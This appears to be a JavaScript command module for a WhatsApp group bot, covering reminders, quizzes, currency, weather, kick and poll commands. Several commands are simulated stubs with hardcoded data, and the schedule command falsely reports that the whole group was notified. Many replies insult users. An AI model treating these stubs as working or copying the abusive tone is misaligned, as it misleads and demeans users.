  aliases: ["wikipedia", "wikisearch"],
  desc: "Search Wikipedia for information",
  categorie: "info",
  reaction: '📖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
🖕 WHERE'S THE SEARCH TERM, YOU NOOB?

📝 *Usage:*
.wiki Albert Einstein
.wiki Solar System
.wiki Artificial Intelligence
      `);
    }
    
    const searchTerm = arg.join(" ");
    
    await repondre(`⏳ Searching Wikipedia for "${searchTerm}"...`);
    
    // In a real implementation, you would use the Wikipedia API
    // This is a simulation with a few hardcoded articles
    const wikiArticles = {
      "albert einstein": {
        title: "Albert Einstein",
        extract: "Albert Einstein (14 March 1879 – 18 April 1955) was a German-born theoretical physicist who is widely held to be one of the greatest and most influential scientists of all time. Best known for developing the theory of relativity, he also made important contributions to quantum mechanics, and was thus a central figure in the revolutionary reshaping of the scientific understanding of nature that modern physics accomplished in the first decades of the twentieth century.",
        url: "https://en.wikipedia.org/wiki/Albert_Einstein"
      },
      "solar system": {
        title: "Solar System",
        extract: "The Solar System is the gravitationally bound system of the Sun and the objects that orbit it. It formed 4.6 billion years ago from the gravitational collapse of a giant interstellar molecular cloud. The vast majority of the system's mass is in the Sun, with most of the remaining mass contained in the planet Jupiter.",
        url: "https://en.wikipedia.org/wiki/Solar_System"
      },
      "artificial intelligence": {
        title: "Artificial Intelligence",
        extract: "Artificial intelligence (AI) is intelligence demonstrated by machines, as opposed to the natural intelligence displayed by animals including humans. AI research has been defined as the field of study of intelligent agents, which refers to any system that perceives its environment and takes actions that maximize its chance of achieving its goals.",
        url: "https://en.wikipedia.org/wiki/Artificial_intelligence"
      }
    };
    
    // Check if we have a matching article (case insensitive)
    const matchingKey = Object.keys(wikiArticles).find(
      key => key.toLowerCase() === searchTerm.toLowerCase()
    );
    
    if (matchingKey) {
      const article = wikiArticles[matchingKey];
      
      let message = `📖 *WIKIPEDIA: ${article.title}*\n\n`;
      message += `${article.extract}\n\n`;
      message += `*Read more:* ${article.url}\n\n`;
      message += `_Note: This is a simulated Wikipedia result. In a real implementation, actual data would be fetched from the Wikipedia API._`;
      
      await repondre(message);
    } else {
      // Simulate a "no results" response
      await repondre(`
🖕 NO WIKI ARTICLE FOUND, YOU NOOB!

Try searching for:
• Albert Einstein
• Solar System
• Artificial Intelligence

_Note: This is a simulation. In a real implementation, the Wikipedia API would be used for comprehensive searches._
      `);
    }
  } catch (error) {
    console.error("Error in wiki command:", error);
    repondre(`💀 WIKI SEARCH FAILED! Error: ${error.message}\nWikipedia is resisting!`);
  }
});

hango({
  nomCom: "currency",
  aliases: ["convert", "exchange"],
  desc: "Convert between currencies",
  categorie: "tools",
  reaction: '💱',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 3) {
      return repondre(`
🖕 WHERE'S THE AMOUNT, SOURCE CURRENCY, AND TARGET CURRENCY, YOU NOOB?

📝 *Usage:*
.currency 100 USD EUR
.currency 50 GBP JPY

*Common currency codes:*
• USD - US Dollar
• EUR - Euro
• GBP - British Pound
• JPY - Japanese Yen
• CAD - Canadian Dollar
• AUD - Australian Dollar
• CNY - Chinese Yuan
• INR - Indian Rupee
      `);
    }
    
    const amount = parseFloat(arg[0]);
    if (isNaN(amount)) {
      return repondre("🖕 WHERE'S THE VALID NUMBER FOR THE AMOUNT, YOU NOOB?");
    }
    
    const fromCurrency = arg[1].toUpperCase();
    const toCurrency = arg[2].toUpperCase();
    
    await repondre(`⏳ Converting ${amount} ${fromCurrency} to ${toCurrency}...`);
    
    // In a real implementation, you would use a currency conversion API
    // This is a simulation with some hardcoded rates
    const exchangeRates = {
      "USD": {
        "EUR": 0.92,
        "GBP": 0.79,
        "JPY": 145.85,
        "CAD": 1.34,
        "AUD": 1.48,
        "CNY": 7.21,
        "INR": 83.12
      },
      "EUR": {
        "USD": 1.09,
        "GBP": 0.86,
        "JPY": 158.32,
        "CAD": 1.46,
        "AUD": 1.61,
        "CNY": 7.83,
        "INR": 90.22
      },
      "GBP": {
        "USD": 1.27,
        "EUR": 1.17,
        "JPY": 184.47,
        "CAD": 1.70,
        "AUD": 1.88,
        "CNY": 9.12,
        "INR": 105.16
      }
    };
    
    if (!exchangeRates[fromCurrency]) {
      return repondre(`🖕 CURRENCY ${fromCurrency} NOT SUPPORTED, YOU NOOB! Try with USD, EUR, or GBP.`);
    }
    
    if (!exchangeRates[fromCurrency][toCurrency]) {
      return repondre(`🖕 CONVERSION FROM ${fromCurrency} TO ${toCurrency} NOT SUPPORTED, YOU NOOB!`);
    }
    
    const rate = exchangeRates[fromCurrency][toCurrency];
    const convertedAmount = amount * rate;
    
    await repondre(`
💱 *CURRENCY CONVERSION*

*${amount} ${fromCurrency} = ${convertedAmount.toFixed(2)} ${toCurrency}*

*Exchange Rate:* 1 ${fromCurrency} = ${rate} ${toCurrency}
*Date:* ${new Date().toLocaleDateString()}

_Note: This is a simulated conversion. In a real implementation, current rates would be fetched from an API._
    `);
  } catch (error) {
    console.error("Error in currency command:", error);
    repondre(`💀 CURRENCY CONVERSION FAILED! Error: ${error.message}\nCurrency exchange is resisting!`);
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "schedule"],
  desc: "Set a reminder for the group",
  categorie: "group",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("🖕 THIS COMMAND CAN ONLY BE USED IN A GROUP CHAT, YOU NOOB!");
    }
    
    if (arg.length < 2) {
      return repondre(`
🖕 WHERE'S THE TIME AND MESSAGE, YOU NOOB?

📝 *Usage:*
.reminder 5m Meeting starts soon!
.reminder 2h Don't forget to submit your reports
.reminder 1d Tomorrow's event reminder

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit from time argument
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("🖕 INVALID TIME FORMAT, YOU NOOB! Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds and human-readable format
    let timeMs = 0;
    let readableTime = "";
    
    switch (timeUnit) {
      case 's':
        timeMs = timeValue * 1000;
        readableTime = timeValue === 1 ? "1 second" : `${timeValue} seconds`;
        break;
      case 'm':
        timeMs = timeValue * 60 * 1000;
        readableTime = timeValue === 1 ? "1 minute" : `${timeValue} minutes`;
        break;
      case 'h':
        timeMs = timeValue * 60 * 60 * 1000;
        readableTime = timeValue === 1 ? "1 hour" : `${timeValue} hours`;
        break;
      case 'd':
        timeMs = timeValue * 24 * 60 * 60 * 1000;
        readableTime = timeValue === 1 ? "1 day" : `${timeValue} days`;
        break;
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    
    // Confirm reminder set
    await repondre(`⏰ Group reminder set! Everyone will be reminded about "${reminderText}" in ${readableTime}.`);
    
    // Set the reminder
    setTimeout(async () => {
      try {
        // Create mentions array for all participants
        const mentions = groupMetadata.participants.map(p => p.id);
        
        // Create a message that tags everyone
        let mentionText = "";
        groupMetadata.participants.forEach(participant => {
          mentionText += `@${participant.id.split('@')[0]} `;
        });
        
        // Send the reminder with mentions
        await hn.sendMessage(dest.chat, {
          text: `⏰ *GROUP REMINDER*\n\n${reminderText}\n\n${mentionText}`,
          mentions: mentions
        });
      } catch (error) {
        console.error("Error in group reminder execution:", error);
      }
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    repondre(`💀 REMINDER FAILED! Error: ${error.message}\nGroup reminder is resisting!`);
  }
});

hango({
  nomCom: "quiz",
  aliases: ["trivia", "question"],
  desc: "Start a quiz with various categories",
  categorie: "fun",
  reaction: '🧠',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const categories = ["general", "science", "history", "geography", "sports", "entertainment"];
    let category = "general";
    
    if (arg[0] && categories.includes(arg[0].toLowerCase())) {
      category = arg[0].toLowerCase();
    }
    
    if (arg[0] && !categories.includes(arg[0].toLowerCase())) {
      return repondre(`
🖕 INVALID CATEGORY, YOU NOOB! Please choose from:
${categories.join(", ")}

📝 *Usage:*
.quiz science
.quiz history
      `);
    }
    
    await repondre(`⏳ Preparing a ${category} quiz question...`);
    
    // In a real implementation, you would fetch from a trivia API
    // This is a simulation with some hardcoded questions
    const quizQuestions = {
      "general": [
        {
          question: "What is the capital of France?",
          options: ["London", "Berlin", "Paris", "Madrid"],
          answer: "Paris"
        },
        {
          question: "Which planet is known as the Red Planet?",
          options: ["Venus", "Mars", "Jupiter", "Saturn"],
          answer: "Mars"
        }
      ],
      "science": [
        {
          question: "What is the chemical symbol for gold?",
          options: ["Go", "Gd", "Au", "Ag"],
          answer: "Au"
        },
        {
          question: "What is the hardest natural substance on Earth?",
          options: ["Platinum", "Diamond", "Titanium", "Quartz"],
          answer: "Diamond"
        }
      ],
      "history": [
        {
          question: "Who was the first President of the United States?",
          options: ["Thomas Jefferson", "George Washington", "Abraham Lincoln", "John Adams"],
          answer: "George Washington"
        },
        {
          question: "In which year did World War II end?",
          options: ["1943", "1944", "1945", "1946"],
          answer: "1945"
        }
      ]
    };
    
    // Default to general if the selected category isn't in our simulation
    const availableQuestions = quizQuestions[category] || quizQuestions["general"];
    const randomQuestion = availableQuestions[Math.floor(Math.random() * availableQuestions.length)];
    
    // Send the question
    let questionMsg = `🧠 *QUIZ: ${category.toUpperCase()}*\n\n`;
    questionMsg += `*Question:* ${randomQuestion.question}\n\n`;
    questionMsg += `*Options:*\n`;
    
    randomQuestion.options.forEach((option, index) => {
      questionMsg += `${index + 1}. ${option}\n`;
    });
    
    questionMsg += `\nReply with the number of your answer within 30 seconds!`;
    
    await repondre(questionMsg);
    
    // In a real implementation, you would listen for answers and check them
    // This is a simulation of the answer reveal
    setTimeout(async () => {
      let answerMsg = `⏱️ *TIME'S UP!*\n\n`;
      answerMsg += `*Question:* ${randomQuestion.question}\n`;
      answerMsg += `*Correct Answer:* ${randomQuestion.answer}\n\n`;
      answerMsg += `_Note: This is a simulated quiz. In a real implementation, answers would be collected and scored._`;
      
      await repondre(answerMsg);
    }, 10000); // Reduced to 10 seconds for simulation
    
  } catch (error) {
    console.error("Error in quiz command:", error);
    repondre(`💀 QUIZ FAILED! Error: ${error.message}\nQuiz is resisting!`);
  }
});

hango({
  nomCom: "schedule",
  aliases: ["event", "plan"],
  desc: "Schedule an event for the group",
  categorie: "group",
  reaction: '📅',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("🖕 THIS COMMAND CAN ONLY BE USED IN A GROUP CHAT, YOU NOOB!");
    }
    
    if (arg.length < 3) {
      return repondre(`
🖕 WHERE'S THE DATE, TIME, AND EVENT DESCRIPTION, YOU NOOB?

📝 *Usage:*
.schedule 2023-10-15 14:30 Team meeting to discuss the new project
.schedule tomorrow 20:00 Game night with friends
.schedule Saturday 18:00 Weekend party at John's place
      `);
    }
    
    const date = arg[0];
    const time = arg[1];
    const eventDescription = arg.slice(2).join(" ");
    
    // Validate date format
    const isValidDate = (
      /^\d{4}-\d{2}-\d{2}$/.test(date) || 
      /^(today|tomorrow|monday|tuesday|wednesday|thursday|friday|saturday|sunday)$/i.test(date)
    );
    
    // Validate time format
    const isValidTime = /^([01]?[0-9]|2[0-3]):[0-5][0-9]$/.test(time);
    
    if (!isValidDate) {
      return repondre("🖕 INVALID DATE FORMAT, YOU NOOB! Use YYYY-MM-DD or day names like 'tomorrow' or 'Monday'.");
    }
    
    if (!isValidTime) {
      return repondre("🖕 INVALID TIME FORMAT, YOU NOOB! Use 24-hour format like 14:30 or 09:15.");
    }
    
    // Get user's name
    const senderName = dest.pushName || dest.sender.split('@')[0];
    
    // In a real implementation, you would store the event in a database
    // This is a simulation
    await repondre(`
📅 *EVENT SCHEDULED*

*Event:* ${eventDescription}
*Date:* ${date}
*Time:* ${time}
*Created by:* ${senderName}

✅ Everyone in the group has been notified of this event!

_Note: This is a simulated event scheduler. In a real implementation, events would be stored and reminders would be sent automatically._
    `);
  } catch (error) {
    console.error("Error in schedule command:", error);
    repondre(`💀 EVENT SCHEDULING FAILED! Error: ${error.message}\nEvent scheduler is resisting!`);
  }
});

hango({
  nomCom: "birthday",
  aliases: ["bday", "birthdays"],
  desc: "Manage birthday reminders for group members",
  categorie: "group",
  reaction: '🎂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("🖕 THIS COMMAND CAN ONLY BE USED IN A GROUP CHAT, YOU NOOB!");
    }
    
    if (!arg[0]) {
      return repondre(`
🖕 WHERE'S THE ACTION, YOU NOOB?

📝 *Usage:*
• .birthday add MM-DD - Add your birthday
• .birthday list - List all birthdays
• .birthday remove - Remove your birthday
      `);
    }
    
    const action = arg[0].toLowerCase();
    
    if (action === "add") {
      if (!arg[1] || !arg[1].match(/^(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/)) {
        return repondre("🖕 WHERE'S THE VALID BIRTHDAY DATE IN MM-DD FORMAT, YOU NOOB? (e.g., 05-15 for May 15).");
      }
      
      const birthdayDate = arg[1];
      const userName = dest.pushName || dest.sender.split('@')[0];
      
      // In a real implementation, you would store this in a database
      // This is a simulation
      await repondre(`
✅ Birthday added successfully!

*User:* ${userName}
*Birthday:* ${birthdayDate}

I'll remind the group when your birthday comes!

_Note: This is a simulation. In a real implementation, birthdays would be stored in a database and automatic reminders would be sent._
      `);
    } 
    else if (action === "list") {
      // In a real implementation, you would fetch from a database
      // This is a simulation with hardcoded data
      await repondre(`
🎂 *GROUP BIRTHDAYS*

• John: 01-15 (January 15)
• Alice: 03-22 (March 22)
• Robert: 07-09 (July 9)
• Emma: 11-30 (November 30)

_Note: This is simulated data. In a real implementation, actual stored birthdays would be displayed._
      `);
    } 
    else if (action === "remove") {
      const userName = dest.pushName || dest.sender.split('@')[0];
      
      // In a real implementation, you would remove from a database
      // This is a simulation
      await repondre(`
✅ Birthday removed successfully!

*User:* ${userName}

Your birthday has been removed from the reminder list.

_Note: This is a simulation. In a real implementation, the birthday would be removed from a database._
      `);
    } 
    else {
      repondre(`
🖕 INVALID ACTION, YOU NOOB! Please use one of:
• add
• list
• remove
      `);
    }
  } catch (error) {
    console.error("Error in birthday command:", error);
    repondre(`💀 BIRTHDAY MANAGEMENT FAILED! Error: ${error.message}\nBirthday database is resisting!`);
  }
});

hango({
  nomCom: "qrcode",
  aliases: ["qr", "genqr"],
  desc: "Generate a QR code from text",
  categorie: "tools",
  reaction: '📲',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
🖕 WHERE'S THE TEXT OR URL, YOU NOOB?

📝 *Usage:*
.qrcode https://example.com
.qrcode Your text here
      `);
    }
    
    const content = arg.join(" ");
    
    // Use Google Chart API to generate real QR code
    const qrSize = 300;
    const qrUrl = `https://chart.googleapis.com/chart?cht=qr&chs=${qrSize}x${qrSize}&chl=${encodeURIComponent(content)}&chld=H|1`;
    
    // Send QR code image
    await hn.sendMessage(dest.chat, {
      image: { url: qrUrl },
      caption: `📲 QR Code for:\n${content}`
    });
  } catch (error) {
    console.error("Error in qrcode command:", error);
    repondre(`💀 QR CODE GENERATION FAILED! Error: ${error.message}\nQR code generator is resisting!`);
  }
});

hango({
  nomCom: "gif",
  aliases: ["gifsearch", "findgif"],
  desc: "Search for a GIF",
  categorie: "media",
  reaction: '🎬',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
🖕 WHERE'S THE SEARCH TERM, YOU NOOB?

📝 *Usage:*
.gif cute cats
.gif thank you
.gif funny
      `);
    }
    
    const searchTerm = arg.join(" ");
    
    await repondre(`⏳ Searching for "${searchTerm}" GIFs...`);
    
    // In a real implementation, you would use Tenor, GIPHY, or another GIF API
    // This is a simulation
    const simulatedGifUrls = [
      "https://media.tenor.com/images/sample1.gif",
      "https://media.giphy.com/media/sample2.gif",
      "https://i.imgur.com/sample3.gif"
    ];
    
    const randomGifUrl = simulatedGifUrls[Math.floor(Math.random() * simulatedGifUrls.length)];
    
    // In a real implementation, you would send the actual GIF
    // This is a placeholder message
    await repondre(`
🎬 *GIF SEARCH*

*Search term:* ${searchTerm}

_Note: This is a simulation. In a real implementation, a GIF matching "${searchTerm}" would be fetched from an API and sent here._
    `);
  } catch (error) {
    console.error("Error in gif command:", error);
    repondre(`💀 GIF SEARCH FAILED! Error: ${error.message}\nGIF search is resisting!`);
  }
});

hango({
  nomCom: "voicenote",
  aliases: ["ttsaudio", "sayaudio"],
  desc: "Convert text to voice note",
  categorie: "media",
  reaction: '🎙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 1) {
      return repondre(`
🖕 WHERE'S THE TEXT, YOU NOOB?

📝 *Usage:*
.voicenote Hello, this is a test of text to voice note
      `);
    }
    
    const text = arg.join(" ");
    
    await repondre(`⏳ Converting text to voice note...`);
    
    // In a real implementation, you would use a Text-to-Speech API to generate audio
    // and then send it as a voice note
    // This is a simulation message
    await repondre(`
🎙️ *TEXT TO VOICE NOTE*

*Text:* ${text}

_Note: This is a simulation. In a real implementation, your text would be converted to an audio file and sent as a voice note using a Text-to-Speech API._
    `);
  } catch (error) {
    console.error("Error in voicenote command:", error);
    repondre(`💀 TEXT TO VOICE NOTE FAILED! Error: ${error.message}\nText-to-Speech is resisting!`);
  }
});

hango({
  nomCom: "worldclock",
  aliases: ["time", "timezone"],
  desc: "Check time in different cities around the world",
  categorie: "info",
  reaction: '🕒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // List of major cities and their timezone offsets
    const timeZones = {
      "london": { name: "London", offset: 0 }, // GMT+0
      "newyork": { name: "New York", offset: -5 }, // GMT-5
      "losangeles": { name: "Los Angeles", offset: -8 }, // GMT-8
      "tokyo": { name: "Tokyo", offset: 9 }, // GMT+9
      "sydney": { name: "Sydney", offset: 10 }, // GMT+10
      "paris": { name: "Paris", offset: 1 }, // GMT+1
      "dubai": { name: "Dubai", offset: 4 }, // GMT+4
      "mumbai": { name: "Mumbai", offset: 5.5 }, // GMT+5:30
      "singapore": { name: "Singapore", offset: 8 }, // GMT+8
      "moscow": { name: "Moscow", offset: 3 } // GMT+3
    };
    
    if (!arg[0]) {
      // If no city is specified, show time for all cities
      const now = new Date();
      let message = `🕒 *WORLD CLOCK*\n\n`;
      
      Object.values(timeZones).forEach(zone => {
        const localTime = new Date(now.getTime() + (zone.offset * 60 + now.getTimezoneOffset()) * 60000);
        message += `*${zone.name}:* ${localTime.toTimeString().slice(0, 5)}\n`;
      });
      
      await repondre(message);
    } else {
      // Check time for specific city
      const cityName = arg.join(" ").toLowerCase().replace(/\s/g, "");
      
      if (timeZones[cityName]) {
        const now = new Date();
        const zone = timeZones[cityName];
        const localTime = new Date(now.getTime() + (zone.offset * 60 + now.getTimezoneOffset()) * 60000);
        
        await repondre(`
🕒 *TIME IN ${zone.name.toUpperCase()}*

*Current Time:* ${localTime.toTimeString().slice(0, 5)}
*Date:* ${localTime.toDateString()}
        `);
      } else {
        let availableCities = Object.values(timeZones).map(zone => zone.name).join(", ");
        
        await repondre(`
🖕 CITY NOT FOUND, YOU NOOB!

*Available cities:*
${availableCities}

📝 *Usage:*
.worldclock Tokyo
.worldclock New York
        `);
      }
    }
  } catch (error) {
    console.error("Error in worldclock command:", error);
    repondre(`💀 TIME CHECK FAILED! Error: ${error.message}\nWorld clock is resisting!`);
  }
});

hango({
  nomCom: "whois",
  aliases: ["useinfo", "checkuser"],
  desc: "Get information about a user",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if a user is tagged
    if (!dest.quoted) {
      return repondre("🖕 TAG A USER BY REPLYING TO THEIR MESSAGE, YOU NOOB!");
    }
    
    const taggedUser = dest.quoted.sender;
    const userName = dest.quoted.pushName || taggedUser.split('@')[0];
    
    // Get user profile picture if possible
    let ppUrl;
    try {
      ppUrl = await hn.profilePictureUrl(taggedUser, 'image');
    } catch {
      ppUrl = null;
    }
    
    // Get user status
    let userStatus;
    try {
      const status = await hn.fetchStatus(taggedUser);
      userStatus = status.status || "No status";
    } catch {
      userStatus = "No status available";
    }
    
    // Check if user is an admin (if in group)
    let adminStatus = "N/A";
    if (dest.isGroup) {
      const groupMetadata = await hn.groupMetadata(dest.chat);
      const isAdmin = groupMetadata.participants.find(p => p.id === taggedUser && (p.admin === 'admin' || p.admin === 'superadmin'));
      adminStatus = isAdmin ? "Yes" : "No";
    }
    
    // Format and send user information
    let message = `👤 *USER INFORMATION*\n\n`;
    message += `*Name:* ${userName}\n`;
    message += `*Number:* ${taggedUser.split('@')[0]}\n`;
    message += `*Status:* ${userStatus}\n`;
    
    if (dest.isGroup) {
      message += `*Admin:* ${adminStatus}\n`;
    }
    
    // Send with profile picture if available
    if (ppUrl) {
      await hn.sendMessage(dest.chat, {
        image: { url: ppUrl },
        caption: message
      });
    } else {
      await repondre(message);
    }
  } catch (error) {
    console.error("Error in whois command:", error);
    repondre(`💀 USER INFORMATION FAILED! Error: ${error.message}\nUser info is resisting!`);
  }
});

hango({
  nomCom: "ytaudio",
  aliases: ["ytmp3", "ytmusic"],
  desc: "Download audio from a YouTube video",
  categorie: "download",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
🖕 WHERE'S THE YOUTUBE URL, YOU NOOB?

📝 *Usage:*
.ytaudio https://www.youtube.com/watch?v=dQw4w9WgXcQ
      `);
    }
    
    const url = arg[0];
    
    // Check if it's a valid YouTube URL
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("🖕 WHERE'S THE VALID YOUTUBE URL, YOU NOOB?");
    }
    
    await repondre("⏳ Processing audio download, please wait...");
    
    // Use y2mate API to extract audio
    const response = await axios.get(`https://www.y2mate.com/mates/en60/analyze/ajax`, {
      params: {
        url: url,
        q_auto: 0,
        ajax: 1
      }
    });
    
    const $ = cheerio.load(response.data);
    const dlLink = $('a#btn_mp3').attr('href');
    
    if (!dlLink) {
      return repondre("😵 FAILED TO EXTRACT AUDIO! Try again later.");
    }
    
    const audioUrl = `https://www.y2mate.com${dlLink}`;
    
    // Download the audio file
    const audioResponse = await axios.get(audioUrl, { responseType: 'arraybuffer' });
    
    // Save the audio file
    const audioPath = path.join(__dirname, 'audio.mp3');
    fs.writeFileSync(audioPath, audioResponse.data);
    
    // Send the audio file
    await hn.sendMessage(dest, {
      audio: { url: audioPath },
      mimetype: 'audio/mpeg'
    }, { quoted: context.ms });
    
    // Clean up the audio file
    fs.unlinkSync(audioPath);
  } catch (error) {
    console.error("Error in ytaudio command:", error);
    repondre(`😵 AUDIO DOWNLOAD FAILED! Error: ${error.message}\nAudio is resisting!`);
  }
});

hango({
  nomCom: "kick",
  aliases: ["remove", "ban"],
  desc: "Remove a member from the group",
  categorie: "group",
  reaction: '🚫',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to remove by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot remove myself from the group.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot remove an admin from the group.");
    }
    
    // Remove the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "remove");
    
    await repondre(`🚫 User @${targetId.split('@')[0]} has been removed from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in kick command:", error);
    await repondre("❌ An error occurred while removing the member.");
  }
});

hango({
  nomCom: "groupsettings",
  aliases: ["setgroup", "editgroup"],
  desc: "Change group settings (name, description, etc.)",
  categorie: "group",
  reaction: '⚙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check for valid setting and value
    if (arg.length < 2) {
      return repondre(`
❌ Please specify a setting and value.

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
      `);
    }
    
    const setting = arg[0].toLowerCase();
    const value = arg.slice(1).join(" ");
    
    switch (setting) {
      case 'name':
        await hn.groupUpdateSubject(dest.chat, value);
        await repondre(`✅ Group name changed to: *${value}*`);
        break;
        
      case 'desc':
        await hn.groupUpdateDescription(dest.chat, value);
        await repondre(`✅ Group description updated.`);
        break;
        
      case 'lock':
        await hn.groupSettingUpdate(dest.chat, 'locked');
        await repondre(`🔒 Group settings have been locked. Only admins can change group info now.`);
        break;
        
      case 'unlock':
        await hn.groupSettingUpdate(dest.chat, 'unlocked');
        await repondre(`🔓 Group settings have been unlocked. All members can change group info now.`);
        break;
        
      default:
        await repondre(`
❌ Invalid setting. Available options:

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
        `);
    }
  } catch (error) {
    console.error("Error in groupsettings command:", error);
    await repondre("❌ An error occurred while updating group settings.");
  }
});

hango({
  nomCom: "poll",
  aliases: ["vote", "createpoll"],
  desc: "Create a poll in the group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check arguments
    if (arg.length < 3) {
      return repondre(`
❌ Please provide a question and at least 2 options.

📝 *Usage:*
.poll What's your favorite color? | Red | Blue | Green | Yellow
      `);
    }
    
    // Parse the poll data
    const pollData = arg.join(" ").split("|").map(item => item.trim());
    const question = pollData[0];
    const options = pollData.slice(1);
    
    if (options.length < 2) {
      return repondre("❌ Please provide at least 2 options separated by | symbol.");
    }
    
    // Create and send the poll
    await hn.sendMessage(dest.chat, {
      poll: {
        name: question,
        values: options,
        selectableCount: 1
      }
    });
  } catch (error) {
    console.error("Error in poll command:", error);
    await repondre("❌ An error occurred while creating the poll. Make sure you're using the correct format: question | option1 | option2 | ...");
  }
});

// Fun and utility commands

hango({
  nomCom: "tts",
  aliases: ["speak", "say"],
  desc: "Convert text to speech",
  categorie: "utility",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to speech.");
    }
    
    // Create TTS URL with Google Translate API
    const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=en&client=tw-ob`;
    
    // Send audio
    await hn.sendMessage(dest.chat, {
      audio: { url: ttsUrl },
      mimetype: 'audio/mp4',
      ptt: true
    });
  } catch (error) {
    console.error("Error in tts command:", error);
    await repondre("❌ An error occurred while generating speech.");
  }
});

hango({
  nomCom: "weather",
  aliases: ["forecast", "climate"],
  desc: "Get weather information for a location",
  categorie: "utility",
  reaction: '🌤️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const location = arg.join(" ");
    
    if (!location) {
      return repondre("❌ Please provide a location to check weather for.");
    }
    
    // Use OpenWeatherMap API (you need to add API key to conf)
    const apiKey = conf.WEATHER_API_KEY || "your_openweathermap_api_key";
    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(location)}&units=metric&appid=${apiKey}`;
    
    const response = await axios.get(weatherUrl);
    const data = response.data;
    
    const weatherInfo = `
🌤️ *Weather in ${data.name}, ${data.sys.country}*

🌡️ *Temperature:* ${Math.round(data.main.temp)}°C
🌡️ *Feels like:* ${Math.round(data.main.feels_like)}°C
💧 *Humidity:* ${data.main.humidity}%
💨 *Wind:* ${data.wind.speed} m/s
☁️ *Conditions:* ${data.weather[0].description}
    `;
    
    await repondre(weatherInfo);
  } catch (error) {
    console.error("Error in weather command:", error);
    await repondre("❌ Could not fetch weather information. Make sure the location name is correct.");
  }
});

hango({
  nomCom: "sticker",
  aliases: ["stiker", "s"],
  desc: "Convert image, video or GIF to sticker",
  categorie: "utility",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    if (!dest.quoted) {
      return repondre("❌ Reply to an image, video or GIF to convert it to a sticker.");
    }
    
    // Check if quoted message contains media
    const quotedMessage = dest.quoted;
    if (!quotedMessage.image && !quotedMessage.video) {
      return repondre("❌ Please reply to an image, short video or GIF.");
    }
    
    // Download the media
    const media = await quotedMessage.download();
    
    // Send as sticker
    await hn.sendMessage(dest.chat, {
      sticker: media,
      author: "Created by Bot",
